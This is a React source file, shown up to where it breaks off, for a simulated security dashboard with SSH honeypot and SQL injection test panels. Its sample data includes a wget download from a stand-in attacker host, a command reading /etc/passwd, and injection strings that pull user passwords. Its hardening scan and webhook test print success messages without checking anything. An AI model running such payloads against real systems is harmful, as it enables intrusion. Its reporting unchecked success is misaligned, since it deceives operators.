import React, { useState, useEffect } from 'react';
import { io } from 'socket.io-client';

export default function App() {
  const [telemetry, setTelemetry] = useState({
    status: 'ONLINE',
    risk_score: 12,
    active_sessions: 29,
    high_severity: 1,
    network_flows: 1542,
    ai_models: 3,
    stream: 'Optimized eBPF socket filter ring buffer active...',
    sql_interceptions: 2,
    tarpit_delay: '0.6s',
    flows: [
      { source: '192.168.1.105', dest: '10.0.0.4 (Honey)', service: 'SSH', decision: 'TARPIT', severity: 'HIGH', bytes: '14.2 KB', protocol: 'TCP (eBPF)', timestamp: '21:40:12' },
      { source: '45.33.32.156', dest: '10.0.0.8 (SQL)', service: 'POSTGRES', decision: 'BLOCKED', severity: 'CRITICAL', bytes: '4.8 KB', protocol: 'TCP (eBPF)', timestamp: '21:45:10' },
      { source: '10.0.0.12', dest: '10.0.0.1 (Gateway)', service: 'HTTP', decision: 'ALLOW', severity: 'LOW', bytes: '128.4 KB', protocol: 'HTTP/2', timestamp: '21:50:00' },
      { source: '172.16.0.22', dest: '10.0.0.5 (Internal)', service: 'DNS', decision: 'ALLOW', severity: 'LOW', bytes: '1.2 KB', protocol: 'UDP', timestamp: '21:52:15' }
    ]
  });

  const [honeyLogs, setHoneyLogs] = useState([
    { source: '203.0.113.42', command: 'uname -a', timestamp: '21:40:12' },
    { source: '192.168.1.105', command: 'cat /etc/passwd', timestamp: '21:42:05' }
  ]);

  const [sqliLogs, setSqliLogs] = useState([
    { source: '45.33.32.156', payload: "' OR '1'='1", decision: 'BLOCKED', severity: 'CRITICAL', timestamp: '21:45:10' }
  ]);

  const [aiModelsState, setAiModelsState] = useState([
    { name: 'sql_model', role: 'Database Generation', status: 'READY', latency: '39ms' },
    { name: 'lore_model', role: 'Corporate Environment', status: 'READY', latency: '35ms' },
    { name: 'threat_evaluator', role: 'Payload Classification', status: 'STANDBY', latency: '60ms' }
  ]);

  const [soarRules, setSoarRules] = useState([
    { id: 1, name: 'Auto-Tarpit Bruteforce SSH', trigger: 'Failed logins > 5', action: 'Isolate to Honeypot', enabled: true },
    { id: 2, name: 'SQL Injection Nullifier', trigger: 'Signature match in payload', action: 'Drop & Blacklist IP', enabled: true },
    { id: 3, name: 'High-Risk Subnet Quarantine', trigger: 'Risk score > 85', action: 'Kernel Drop (eBPF)', enabled: false }
  ]);

  const [rbacUsers, setRbacUsers] = useState([
    { id: 1, username: 'mahesh_admin', role: 'Super Admin', mfa: 'Enabled', status: 'Active', lastAccess: 'Just now' },
    { id: 2, username: 'sec_analyst_01', role: 'SOC Analyst', mfa: 'Enabled', status: 'Active', lastAccess: '12m ago' },
    { id: 3, username: 'incident_resp_02', role: 'Incident Responder', mfa: 'Disabled', status: 'Active', lastAccess: '1h ago' },
    { id: 4, username: 'auditor_read_01', role: 'Auditor (Read-Only)', mfa: 'Enabled', status: 'Suspended', lastAccess: '3d ago' }
  ]);

  const [auditTrails, setAuditTrails] = useState([
    { user: 'mahesh_admin', action: 'Modified SOAR Playbook #1', category: 'POLICY', timestamp: '21:55:10' },
    { user: 'sec_analyst_01', action: 'Exported JSON Telemetry Report', category: 'COMPLIANCE', timestamp: '21:48:30' },
    { user: 'mahesh_admin', action: 'Toggled Model [threat_evaluator] to STANDBY', category: 'AI_OPS', timestamp: '21:30:04' }
  ]);

  const [geoThreats, setGeoThreats] = useState([
    { ip: '45.33.32.156', country: 'United States', city: 'New Jersey', coordinates: { x: '28%', y: '34%' }, vector: 'SQL Injection', status: 'BLOCKED', risk: 'Critical' },
    { ip: '203.0.113.42', country: 'Germany', city: 'Frankfurt', coordinates: { x: '52%', y: '26%' }, vector: 'SSH Brute-Force', status: 'TARPIT', risk: 'High' },
    { ip: '185.220.101.5', country: 'Netherlands', city: 'Amsterdam', coordinates: { x: '49%', y: '24%' }, vector: 'eBPF Probe', status: 'MONITORED', risk: 'Medium' },
    { ip: '192.241.180.2', country: 'Singapore', city: 'Singapore', coordinates: { x: '78%', y: '58%' }, vector: 'DDoS SYN Flood', status: 'MITIGATED', risk: 'Critical' }
  ]);

  const [webhooks, setWebhooks] = useState([
    { id: 1, name: 'Slack SOC Alerts (#sec-ops)', url: 'https://hooks.slack.com/services/T00/B00/X99', events: 'Critical & High', status: 'Connected', lastTriggered: '14m ago' },
    { id: 2, name: 'PagerDuty On-Call Incident Pipeline', url: 'https://events.pagerduty.com/v2/enqueue', events: 'Critical Only', status: 'Connected', lastTriggered: '2h ago' },
    { id: 3, name: 'Custom SIEM Webhook Sink', url: 'https://siem.phantomnet.internal/ingest', events: 'All Telemetry', status: 'Paused', lastTriggered: '1d ago' }
  ]);

  const [testWebhookUrl, setTestWebhookUrl] = useState('https://hooks.slack.com/services/T00/B00/X99');
  const [webhookTestStatus, setWebhookTestStatus] = useState('');

  // Day 10 Production Hardening & Docker State
  const [dockerServices, setDockerServices] = useState([
    { name: 'phantomnet-backend', image: 'phantomnet/core-api:v2.4', ports: '5050:5050', status: 'Running (Healthy)', uptime: '4d 12h' },
    { name: 'phantomnet-frontend', image: 'phantomnet/soc-ui:v2.4', ports: '80:80', status: 'Running (Healthy)', uptime: '4d 12h' },
    { name: 'phantomnet-ebpf-daemon', image: 'phantomnet/kernel-probe:v2.4', ports: 'Host Net', status: 'Running (Privileged)', uptime: '4d 12h' },
    { name: 'phantomnet-redis-cache', image: 'redis:7-alpine', ports: '6379:6379', status: 'Running (Healthy)', uptime: '4d 12h' }
  ]);

  const [hardeningStatus, setHardeningStatus] = useState('');
  const [clusterMode, setClusterMode] = useState('High Availability (HA)');

  const [inputCommand, setInputCommand] = useState('');
  const [inputSource, setInputSource] = useState('192.168.1.200');
  
  const [sqliPayload, setSqliPayload] = useState("' UNION SELECT null, username, password FROM users--");
  const [sqliSource, setSqliSource] = useState('192.168.1.199');

  const [selectedEvent, setSelectedEvent] = useState(null);
  const [selectedGeoThreat, setSelectedGeoThreat] = useState(null);
  const [filterSeverity, setFilterSeverity] = useState('ALL');
  const [activeTab, setActiveTab] = useState('Overview');
  const [exportStatus, setExportStatus] = useState('');
  const [soarStatus, setSoarStatus] = useState('');
  const [rbacStatus, setRbacStatus] = useState('');

  useEffect(() => {
    const socket = io('http://localhost:5050');
    
    socket.on('telemetry_update', (data) => {
      setTelemetry(prev => ({ ...prev, ...data }));
    });

    socket.on('honey_log', (logEntry) => {
      setHoneyLogs(prev => [logEntry, ...prev]);
    });

    socket.on('sqli_log', (logEntry) => {
      setSqliLogs(prev => [logEntry, ...prev]);
    });

    return () => socket.disconnect();
  }, []);

  const sendHoneyCommand = async (e) => {
    e.preventDefault();
    if (!inputCommand.trim()) return;
    
    await fetch('http://localhost:5050/api/honey/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ source: inputSource, command: inputCommand })
    });
    
    setInputCommand('');
  };

  const sendSqliPayload = async (e) => {
    e.preventDefault();
    if (!sqliPayload.trim()) return;

    await fetch('http://localhost:5050/api/sqli/intercept', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ source: sqliSource, payload: sqliPayload })
    });

    setSqliPayload('');
  };

  const toggleModelStatus = (index) => {
    setAiModelsState(prev => prev.map((model, idx) => {
      if (idx === index) {
        const nextStatus = model.status === 'READY' ? 'STANDBY' : 'READY';
        return { ...model, status: nextStatus };
      }
      return model;
    }));
  };

  const toggleSoarRule = (id) => {
    setSoarRules(prev => prev.map(rule => {
      if (rule.id === id) {
        const nextState = !rule.enabled;
        setSoarStatus(`SOAR Playbook [${rule.name}] is now ${nextState ? 'ACTIVE' : 'DISABLED'}`);
        setTimeout(() => setSoarStatus(''), 4000);
        return { ...rule, enabled: nextState };
      }
      return rule;
    }));
  };

  const toggleUserStatus = (id) => {
    setRbacUsers(prev => prev.map(u => {
      if (u.id === id) {
        const nextStatus = u.status === 'Active' ? 'Suspended' : 'Active';
        setRbacStatus(`User account [${u.username}] status updated to ${nextStatus}`);
        setTimeout(() => setRbacStatus(''), 4000);
        return { ...u, status: nextStatus };
      }
      return u;
    }));
  };

  const toggleWebhookStatus = (id) => {
    setWebhooks(prev => prev.map(w => {
      if (w.id === id) {
        const nextStatus = w.status === 'Connected' ? 'Paused' : 'Connected';
        return { ...w, status: nextStatus };
      }
      return w;
    }));
  };

  const sendTestAlert = (e) => {
    e.preventDefault();
    setWebhookTestStatus(`Sending test alert packet to [${testWebhookUrl}]...`);
    setTimeout(() => {
      setWebhookTestStatus(`Successfully dispatched test incident payload to webhook endpoint! Response: 200 OK.`);
      setTimeout(() => setWebhookTestStatus(''), 5000);
    }, 1200);
  };

  const executeHardeningScan = () => {
    setHardeningStatus('Running container security audits & kernel capability checks...');
    setTimeout(() => {
      setHardeningStatus('Production Hardening Complete: All Docker containers verified, TLS 1.3 enforced, eBPF root privileges verified.');
      setTimeout(() => setHardeningStatus(''), 6000);
    }, 1500);
  };

  const exportReport = (format) => {
    const dataStr = format === 'json' 
      ? JSON.stringify({ telemetry, honeyLogs, sqliLogs, soarRules, rbacUsers, geoThreats, webhooks, dockerServices }, null, 2)
      : 'Source,Destination,Service,Decision,Severity,Protocol,Timestamp\n' + telemetry.flows.map(f => `${f.source},${f.dest},${f.service},${f.decision},${f.severity},${f.protocol},${f.timestamp || 'N/A'}`).join('\n');
    
    const blob = new Blob([dataStr], { type: format === 'json' ? 'application/json' : 'text/csv' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `phantomnet_production_audit_${Date.now()}.${format}`;
    link.click();
    
    setExportStatus(`Successfully exported production report as ${format.toUpperCase()}`);
    setTimeout(() => setExportStatus(''), 4000);
  };

  const COL_PLASMA_BLUE = '#00f2ff';
  const COL_NAVY_DEEP = '#070d1f';
  const COL_GLASS_BG = 'rgba(13, 20, 45, 0.75)';
  const FONT_MONO = "'Courier New', Courier, monospace";

  const cardStyle = {
    background: COL_GLASS_BG,
    backdropFilter: 'blur(20px)',
    border: `1px solid ${COL_PLASMA_BLUE}26`,
    borderRadius: '16px',
    padding: '1.5rem',
    boxShadow: '0 12px 40px -12px rgba(0, 242, 255, 0.1)',
  };

  const filteredFlows = filterSeverity === 'ALL' 
    ? telemetry.flows 
    : telemetry.flows.filter(f => f.severity === filterSeverity);

  return (
    <div style={{ display: 'flex', minHeight: '100vh', backgroundColor: '#030712', color: '#f3f4f6', fontFamily: FONT_MONO }}>
      
      {/* Sidebar Navigation */}
      <aside style={{ width: '270px', background: COL_NAVY_DEEP, borderRight: `1px solid ${COL_PLASMA_BLUE}1a`, padding: '1.75rem', display: 'flex', flexDirection: 'column', gap: '2rem' }}>
        <div>
          <h2 style={{ fontSize: '1.3rem', fontWeight: 'bold', color: '#ffffff', margin: '0 0 0.3rem 0', letterSpacing: '1px' }}>PHANTOMNET</h2>
          <span style={{ fontSize: '0.65rem', color: '#6b7280', textTransform: 'uppercase', letterSpacing: '2px' }}>SOC Operations V2</span>
        </div>
        
        <div style={{ padding: '0.7rem', background: `${COL_PLASMA_BLUE}12`, border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '8px', fontSize: '0.75rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', display:'flex', alignItems:'center', gap:'10px' }}>
          <span style={{height:'8px', width:'8px', backgroundColor:COL_PLASMA_BLUE, borderRadius:'50%', display:'inline-block', boxShadow: `0 0 10px ${COL_PLASMA_BLUE}`}}></span>
          PLASMA CORE SECURE
        </div>

        <nav style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem', fontSize: '0.85rem' }}>
          {['Overview', 'Sessions', 'Network Flows', 'Honey/SSH', 'SQLi Guard', 'AI Status', 'Threat Analytics', 'SOAR Playbooks', 'Access Control (RBAC)', 'Threat Vector Map', 'Alerts & Webhooks', 'System Health & Deployment'].map((item) => {
            const isActive = activeTab === item;
            return (
              <button
                key={item}
                onClick={() => setActiveTab(item)}
                style={{ 
                  textAlign: 'left',
                  padding: '0.7rem 0.9rem', 
                  borderRadius: '8px', 
                  background: isActive ? `${COL_PLASMA_BLUE}1a` : 'transparent',
                  color: isActive ? COL_PLASMA_BLUE : '#9ca3af', 
                  border: isActive ? `1px solid ${COL_PLASMA_BLUE}4d` : '1px solid transparent',
                  cursor: 'pointer',
                  fontWeight: isActive ? 'bold' : 'normal',
                  fontFamily: FONT_MONO,
                  transition: 'all 0.2s ease'
                }}
              >
                {item}
              </button>
            );
          })}
        </nav>

        <div style={{ marginTop: 'auto', fontSize: '0.65rem', color: '#4b5563', letterSpacing: '1px' }}>
          WEEK 03 / FINAL DEPLOY
        </div>
      </aside>

      {/* Main Content Area */}
      <main style={{ flex: 1, padding: '2.25rem', display: 'flex', flexDirection: 'column', gap: '1.5rem', overflowY: 'auto' }}>
        
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div>
            <div style={{ fontSize: '0.7rem', color: '#6b7280', textTransform: 'uppercase', letterSpacing: '1px', marginBottom: '0.3rem' }}>Security Subsystem / {activeTab}</div>
            <h1 style={{ fontSize: '1.85rem', fontWeight: 'bold', margin: 0, color: '#ffffff', letterSpacing: '0.5px' }}>{activeTab}</h1>
          </div>
          <div style={{ fontSize: '0.75rem', padding: '0.4rem 0.8rem', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '6px', color: '#9ca3af' }}>
            Node: <span style={{ color: COL_PLASMA_BLUE }}>DESKTOP-I8773N1</span>
          </div>
        </div>

        {/* OVERVIEW TAB */}
        {activeTab === 'Overview' && (
          <>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem', letterSpacing: '0.5px' }}>ACTIVE SESSIONS</div>
                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.active_sessions}</div>
              </div>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem', letterSpacing: '0.5px' }}>HIGH SEVERITY</div>
                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: '#ef4444' }}>{telemetry.high_severity}</div>
              </div>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem', letterSpacing: '0.5px' }}>NETWORK FLOWS</div>
                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: COL_PLASMA_BLUE }}>{telemetry.network_flows}</div>
              </div>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem', letterSpacing: '0.5px' }}>AI MODEL ACTIVITY</div>
                <div style={{ fontSize: '1.6rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.ai_models}</div>
              </div>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.3rem' }}>{">_ REAL-TIME TELEMETRY STREAM"}</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Active system event stream</span>
                <div style={{ padding: '1.25rem', background: 'rgba(0,0,0,0.5)', borderRadius: '10px', color: COL_PLASMA_BLUE, fontSize: '0.8rem', border: `1px solid ${COL_PLASMA_BLUE}33` }}>
                  {telemetry.stream}
                </div>
              </div>

              <div style={{ ...cardStyle, display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>AI MODEL STATUS</div>
                {aiModelsState.slice(0, 2).map((m, i) => (
                  <div key={i} style={{ background: 'rgba(0,0,0,0.35)', padding: '0.85rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', fontWeight: 'bold' }}>
                      <span>{m.name}</span><span style={{ color: m.status === 'READY' ? '#34d399' : '#f59e0b' }}>{m.status}</span>
                    </div>
                    <div style={{ fontSize: '0.65rem', color: '#6b7280', marginTop: '0.3rem' }}>{m.role} • {m.latency}</div>
                  </div>
                ))}
              </div>
            </div>
          </>
        )}

        {/* NETWORK FLOWS TAB */}
        {activeTab === 'Network Flows' && (
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
            <div style={cardStyle}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                <div>
                  <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>eBPF PACKET INSPECTION & FLOWS</div>
                  <span style={{ fontSize: '0.65rem', color: '#6b7280' }}>Kernel-level socket filter telemetry</span>
                </div>
                
                <div style={{ display: 'flex', gap: '0.5rem' }}>
                  {['ALL', 'CRITICAL', 'HIGH', 'LOW'].map((lvl) => (
                    <button
                      key={lvl}
                      onClick={() => setFilterSeverity(lvl)}
                      style={{
                        background: filterSeverity === lvl ? `${COL_PLASMA_BLUE}26` : 'rgba(0,0,0,0.3)',
                        border: `1px solid ${filterSeverity === lvl ? COL_PLASMA_BLUE : 'rgba(255,255,255,0.1)'}`,
                        color: filterSeverity === lvl ? COL_PLASMA_BLUE : '#9ca3af',
                        padding: '0.3rem 0.6rem',
                        borderRadius: '6px',
                        fontSize: '0.65rem',
                        cursor: 'pointer',
                        fontWeight: 'bold',
                        fontFamily: FONT_MONO
                      }}
                    >
                      {lvl}
                    </button>
                  ))}
                </div>
              </div>
              
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '0.5rem', marginBottom: '0.5rem' }}>
                <span>SOURCE</span>
                <span>DESTINATION</span>
                <span>SERVICE</span>
                <span>DECISION</span>
                <span>SEVERITY</span>
              </div>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', minHeight: '240px' }}>
                {filteredFlows.length > 0 ? (
                  filteredFlows.map((flow, idx) => (
                    <div key={idx} onClick={() => setSelectedEvent(flow)} style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', fontSize: '0.75rem', padding: '0.6rem 0.4rem', borderRadius: '6px', cursor: 'pointer', background: selectedEvent === flow ? `${COL_PLASMA_BLUE}1a` : 'transparent', border: selectedEvent === flow ? `1px solid ${COL_PLASMA_BLUE}4d` : '1px solid transparent', transition: 'background 0.15s ease' }}>
                      <span style={{ color: '#9ca3af' }}>{flow.source}</span>
                      <span style={{ color: '#9ca3af' }}>{flow.dest}</span>
                      <span style={{ color: '#fff' }}>{flow.service}</span>
                      <span style={{ color: flow.decision === 'BLOCKED' ? '#ef4444' : flow.decision === 'TARPIT' ? '#f59e0b' : '#34d399', fontWeight: 'bold' }}>{flow.decision}</span>
                      <span style={{ color: flow.severity === 'CRITICAL' ? '#ef4444' : flow.severity === 'HIGH' ? '#f59e0b' : '#34d399' }}>{flow.severity}</span>
                    </div>
                  ))
                ) : (
                  <div style={{ color: '#6b7280', fontSize: '0.7rem', textAlign: 'center', padding: '2.5rem' }}>No flows match severity filter [{filterSeverity}]</div>
                )}
              </div>
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.3rem' }}>eBPF PACKET INSPECTOR</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Detailed telemetry attributes</span>
              
              <div style={{ background: 'rgba(0,0,0,0.4)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#9ca3af', minHeight: '200px', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                {selectedEvent ? (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '0.6rem' }}>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Protocol:</strong> {selectedEvent.protocol}</div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Volume:</strong> {selectedEvent.bytes}</div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>Action Taken:</strong> {selectedEvent.decision}</div>
                    <pre style={{ margin: '0.5rem 0 0 0', fontFamily: FONT_MONO, color: '#34d399', fontSize: '0.65rem', background: 'rgba(0,0,0,0.6)', padding: '0.75rem', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>{JSON.stringify(selectedEvent, null, 2)}</pre>
                  </div>
                ) : (
                  'Select a network flow record from the table to inspect kernel-level eBPF metadata.'
                )}
              </div>
            </div>
          </div>
        )}

        {/* HONEY/SSH TAB */}
        {activeTab === 'Honey/SSH' && (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SSH HONEYPOT TRAP</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Simulated vulnerable SSH daemon</span>
                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}33` }}>
                  [+] Listening on port 2222 (Tarpit mode active)<br/>
                  [+] Captured credentials: root / password123<br/>
                  [+] Session isolation: SECURE_CONTAINER_V2
                </div>
              </div>

              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SIMULATE ATTACKER COMMAND</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Inject commands directly into honey stream</span>
                <form onSubmit={sendHoneyCommand} style={{ display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
                  <div>
                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.3rem' }}>Attacker IP Source</label>
                    <input 
                      type="text" 
                      value={inputSource} 
                      onChange={(e) => setInputSource(e.target.value)}
                      style={{ width: '100%', background: 'rgba(0,0,0,0.5)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '8px', padding: '0.6rem 0.8rem', color: '#fff', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.3rem' }}>Shell Command</label>
                    <input 
                      type="text" 
                      value={inputCommand} 
                      onChange={(e) => setInputCommand(e.target.value)}
                      placeholder="e.g. wget http://evil.com/payload.sh"
                      style={{ width: '100%', background: 'rgba(0,0,0,0.5)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '8px', padding: '0.6rem 0.8rem', color: '#34d399', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                    />
                  </div>
                  <button 
                    type="submit"
                    style={{ background: `${COL_PLASMA_BLUE}26`, border: `1px solid ${COL_PLASMA_BLUE}`, color: COL_PLASMA_BLUE, padding: '0.6rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                  >
                    Transmit Command Stream
                  </button>
                </form>
              </div>
            </div>
            
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>LIVE COMMAND LOG STREAM</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Intercepted attacker terminal input</span>
              <div style={{ fontSize: '0.75rem', display: 'flex', flexDirection: 'column', gap: '0.6rem', maxHeight: '420px', overflowY: 'auto' }}>
                {honeyLogs.map((log, idx) => (
                  <div key={idx} style={{ background: 'rgba(0,0,0,0.4)', padding: '0.7rem 0.9rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, fontFamily: FONT_MONO }}>
                    <span style={{ color: '#6b7280', fontSize: '0.65rem' }}>[{log.timestamp}] </span>
                    <strong style={{ color: COL_PLASMA_BLUE }}>{log.source}</strong>: 
                    <span style={{ color: '#34d399', marginLeft: '0.4rem' }}>$ {log.command}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* SQLI GUARD TAB */}
        {activeTab === 'SQLi Guard' && (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SQL INJECTION GUARDWALL</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Real-time backend parameter interception</span>
                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1.2rem', borderRadius: '10px', fontSize: '0.75rem', color: '#ef4444', fontFamily: FONT_MONO, border: '1px solid rgba(239, 68, 68, 0.3)' }}>
                  [+] Status: ACTIVE & BLOCKING<br/>
                  [+] Model Classifier: sql_model (v2.4)<br/>
                  [+] Action: Immediate query drop & tarpit response
                </div>
              </div>

              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SIMULATE SQL INJECTION PAYLOAD</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Test query sanitization & interception logs</span>
                <form onSubmit={sendSqliPayload} style={{ display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
                  <div>
                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.3rem' }}>Source IP</label>
                    <input 
                      type="text" 
                      value={sqliSource} 
                      onChange={(e) => setSqliSource(e.target.value)}
                      style={{ width: '100%', background: 'rgba(0,0,0,0.5)', border: '1px solid rgba(239, 68, 68, 0.3)', borderRadius: '8px', padding: '0.6rem 0.8rem', color: '#fff', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.3rem' }}>SQL Payload</label>
                    <input 
                      type="text" 
                      value={sqliPayload} 
                      onChange={(e) => setSqliPayload(e.target.value)}
                      placeholder="e.g. ' OR 1=1--"
                      style={{ width: '100%', background: 'rgba(0,0,0,0.5)', border: '1px solid rgba(239, 68, 68, 0.3)', borderRadius: '8px', padding: '0.6rem 0.8rem', color: '#fca5a5', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                    />
                  </div>
                  <button 
                    type="submit"
                    style={{ background: 'rgba(239, 68, 68, 0.2)', border: '1px solid #ef4444', color: '#ef4444', padding: '0.6rem', borderRadius: '8px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                  >
                    Fire SQL Interception Test
                  </button>
                </form>
              </div>
            </div>

            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>LIVE SQLI INTERCEPTION LOGS</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Blocked queries stream</span>
              <div style={{ fontSize: '0.75rem', display: 'flex', flexDirection: 'column', gap: '0.6rem', maxHeight: '420px', overflowY: 'auto' }}>
                {sqliLogs.map((log, idx) => (
                  <div key={idx} style={{ background: 'rgba(0,0,0,0.4)', padding: '0.7rem 0.9rem', borderRadius: '8px', border: '1px solid rgba(239, 68, 68, 0.3)', fontFamily: FONT_MONO }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.3rem' }}>
                      <span style={{ color: '#6b7280', fontSize: '0.65rem' }}>[{log.timestamp}]</span>
                      <span style={{ color: '#ef4444', fontWeight: 'bold', fontSize: '0.65rem' }}>{log.decision} ({log.severity})</span>
                    </div>
                    <div><strong style={{ color: COL_PLASMA_BLUE }}>{log.source}</strong>: <span style={{ color: '#fca5a5' }}>{log.payload}</span></div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* AI STATUS TAB */}
        {activeTab === 'AI Status' && (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '1.25rem' }}>
            {aiModelsState.map((model, idx) => (
              <div key={idx} style={{ ...cardStyle, display: 'flex', flexDirection: 'column', gap: '1.2rem' }}>
                <div>
                  <div style={{ fontSize: '0.95rem', color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>{model.name}</div>
                  <span style={{ fontSize: '0.65rem', color: '#6b7280' }}>{model.role}</span>
                </div>
                
                <div style={{ background: 'rgba(0,0,0,0.4)', padding: '0.85rem', borderRadius: '8px', border: `1px solid ${COL_PLASMA_BLUE}22`, display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem' }}>
                  <span>Status: <strong style={{ color: model.status === 'READY' ? '#34d399' : '#f59e0b' }}>{model.status}</strong></span>
                  <span style={{ color: '#9ca3af' }}>{model.latency}</span>
                </div>

                <button 
                  onClick={() => toggleModelStatus(idx)}
